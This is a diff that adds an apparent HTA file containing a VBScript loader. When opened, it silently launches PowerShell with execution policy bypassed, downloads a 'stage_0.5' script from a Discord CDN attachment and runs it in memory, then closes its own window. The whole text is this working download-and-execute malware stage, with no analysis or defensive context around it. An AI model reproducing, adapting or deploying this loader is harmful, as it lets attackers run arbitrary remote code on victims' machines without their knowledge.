@@ -1,0 +1,12 @@
+﻿<script language="VBScript">
+
+    Function var_dostuff()
+            Dim varSh
+            Set varSh = CreateObject("Wscript.Shell")
+            varSh.run "powershell.exe -ep bypass -c 'iex(new-object net.webclient).downloadString(`'https://cdn.discordapp.com/attachments/934181360782954499/938906115981320192/stage_0.5.txt`')'", 0, true
+    End Function
+
+    var_dostuff
+
+    self.close
+</script>
